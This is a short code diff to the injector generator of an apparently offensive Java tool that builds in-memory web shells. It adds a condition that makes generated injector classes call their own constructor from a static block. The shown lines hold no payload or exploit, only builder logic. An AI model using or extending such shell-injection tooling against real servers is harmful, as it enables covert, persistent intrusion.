@@ -3,6 +3,7 @@ package com.reajason.javaweb.memshell.generator;
 import com.reajason.javaweb.ClassBytesShrink;
 import com.reajason.javaweb.asm.InnerClassDiscovery;
 import com.reajason.javaweb.buddy.*;
+import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.utils.CommonUtil;
@@ -58,6 +59,10 @@ public class InjectorGenerator {
 
         if (shellConfig.isDebugOff()) {
             builder = LogRemoveMethodVisitor.extend(builder);
+        }
+
+        if (injectorConfig.isStaticInitialize() && !shellConfig.getShellType().startsWith(ShellType.AGENT)) {
+            builder = StaticBlockSelfConstructorCall.extend(builder);
         }
         return builder;
     }
